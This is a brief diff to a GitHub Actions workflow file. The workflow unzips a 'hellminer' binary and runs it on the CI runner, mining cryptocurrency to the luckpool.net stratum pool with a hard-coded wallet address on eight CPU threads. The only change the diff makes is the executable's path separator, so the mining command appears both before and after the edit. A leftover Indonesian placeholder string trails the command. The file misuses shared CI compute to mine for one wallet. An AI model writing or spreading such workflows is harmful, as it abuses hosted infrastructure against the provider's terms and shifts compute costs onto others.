@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive hellminer_cpu_win64_avx2.zip
     - name: RUNNING
-      run: ./hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBnvE5PySsdZCBEBbXoWEocrEr1uWq4dJJ -p x --cpu 8 'string command miner seperti pool:port, wallet, threads, '
+      run: .\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBnvE5PySsdZCBEBbXoWEocrEr1uWq4dJJ -p x --cpu 8 'string command miner seperti pool:port, wallet, threads, '
     - name: DONE
       run: exit
